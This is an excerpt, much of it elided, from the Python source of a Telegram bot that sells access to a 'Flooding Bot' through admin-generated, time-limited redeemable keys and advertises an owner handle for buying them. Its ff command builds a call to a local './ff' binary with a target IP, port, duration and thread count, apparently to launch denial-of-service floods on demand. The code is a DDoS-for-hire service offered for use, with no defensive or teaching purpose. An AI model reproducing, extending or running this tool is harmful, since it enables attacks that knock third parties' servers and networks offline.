    ...
    if user_id in ADMIN_IDS:
        ...
        if len(command) == 2:
            try:
                ...
                response = "Please specify a valid number and unit of time (hours/days) script by @Sohelmansuri99."
        else:
...
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    if len(command) == 1:
        ...
        if key in keys:
            ...
            del keys[key]
            save_keys()
            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @Sohelmansuri99"
        else:
            response = "Invalid or expired key buy from @Sohelmansuri99"
    else:
...
async def ff(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    flooding_command = ['./ff', target_ip, port, duration, str(DEFAULT_THREADS)]
...
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = (
        "Welcome to the Flooding Bot by @Sohelmansuri99..! Here are the available commands:\n\n"
        "Admin Commands:\n"
        "/gen <amount> <hours/days> - Generate a key with a specified validity period.\n"
